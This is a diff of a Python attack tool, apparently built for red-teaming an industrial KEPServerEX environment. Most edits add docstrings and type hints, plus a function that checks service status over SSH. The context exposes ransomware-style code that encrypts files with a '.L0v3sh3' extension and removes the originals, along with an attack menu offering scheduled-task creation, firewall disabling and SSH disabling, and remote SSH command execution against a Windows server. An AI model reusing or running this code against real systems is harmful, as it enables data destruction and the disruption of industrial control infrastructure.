@@ -68,13 +68,13 @@ def ssh_run_command(command: str, host: str=WINDOWS_SERVER_IP, username: str=USE
     Note that the command will run through whichever shell upon ssh. Typically, for windows, it's command prompt and for linux, it's bash. The default values are specified at the top of the file
 
     Args:
-        command: Command to run.
-        host: IP Address of the remote device.
-        username: Username of the remote device.
-        password: Password of the remote device.
+        command (str): Command to run.
+        host (str): IP Address of the remote device.
+        username (str): Username of the remote device.
+        password (str): Password of the remote device.
     
     Returns:
-        The output of the command ran
+        str: The output of the command ran
 
     """
     ssh_output: str = "" # Declare as string to prevent error proning
@@ -330,17 +330,17 @@ def encrypt_files() -> None:
     except Exception as e:
         print("Encryption Failed.\nFail.\n")
 
-def encrypt(dataFile, publicKey):
+def encrypt(dataFile: Path, publicKey: bytes) -> None:
     '''
     <Insert description here>
     NOTE: use EAX mode to allow detection of unauthorized modifications
 
     Args:
-        dataFile: path to file to encrypt
-        publicKey: The public key
+        dataFile (pathlib.Path): path to file to encrypt
+        publicKey (bytes): The public key
 
     Returns:
-        Encrypted file with extension .L0v3sh3 and remove original file
+        None: Encrypted file with extension .L0v3sh3 and remove original file
     '''
     # read data from file
     extension = dataFile.suffix.lower()
@@ -364,7 +364,7 @@ def encrypt(dataFile, publicKey):
     ciphertext, tag = cipher.encrypt_and_digest(data)
 
     # save the encrypted data to file
-    fileName= dataFile.split(extension)[0]
+    fileName = dataFile.split(extension)[0]
     fileExtension = '.encrypted'
     encryptedFile = fileName + fileExtension
     with open(encryptedFile, 'wb') as f:
@@ -380,9 +380,13 @@ def recurseFiles(baseDirectory):
         else:
             yield from recurseFiles(entry.path)
 
-def decrypt(dataFile, privatekey):
+def decrypt(dataFile: Path, privatekey: bytes) -> None:
     """
     NOTE: use EAX mode to allow detection of unauthorized modifications
+
+    Args:
+        dataFile (pathlib.Path): path to file to encrypt
+        privatekey (bytes): The private key
     """
 
     key = RSA.import_key(privatekey)
@@ -1022,11 +1026,11 @@ def kep_connect(host: str=WINDOWS_SERVER_IP, port: int=57412) -> connection.serv
     NOTE: 172.16.2.223 if at lv 6
 
     Args:
-        host: IP Address of the Remote KEPServer
-        port: Port of the Remote KEPServer
+        host (str): IP Address of the Remote KEPServer
+        port (str): Port of the Remote KEPServer
 
     Returns:
-        returns an instance of kepconfig.connection.server
+        kepconfig.connection.server: returns an instance of kepconfig.connection.server
     """
     # 172.16.2.77 if at lv 7
     # 172.16.2.223 if at lv 6
@@ -1094,7 +1098,7 @@ def kep_server_stop() -> bool:
     Stops KEPServer service
 
     Returns:
-        A boolean based off if the command stop service could execute or not.
+        bool: True/False based on whether the command `stop service` could execute or not.
     """
     command_output = ssh_run_command("sc query KEPServerEXV6")
     if "RUNNING" in command_output:
@@ -1125,7 +1129,7 @@ def kep_server_start():
     Starts KEPServer service
 
     Returns:
-        A boolean based off if the command start service could execute or not.
+        bool: True/False based on whether the command `start service` could execute or not.
     """
     command_output = ssh_run_command("sc query KEPServerEXV6")
     if "STOPPED" in command_output:
@@ -1151,6 +1155,19 @@ def kep_server_start():
         print("Something went wrong!")
         return False
 
+def kep_get_service_status() -> bool:
+    """
+    Get KEP service status
+
+    Returns:
+        bool: True/False based on whether KEPServerEXV6 is running or not.
+    """
+    command_output = ssh_run_command(r'powershell -command "Get-Service KEPServerEXV6 | Select-Object -Property Status"')
+    if "Running" in command_output:
+        print("KEPSERVER Running")
+        return True
+    return False
+
 ########
 # MAIN #
 ########
@@ -1161,7 +1178,7 @@ def main():
     #     check_admin()
 
     match attack_option:
-        case "1":  create_scheduled_task() 
+        case "1":  create_scheduled_task() # TODO: Determine if this function is depricated or can be modified
         #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH) # TODO: Determine if this function is depricated
         case "3":  disable_firewall()
         case "4":  disable_ssh()
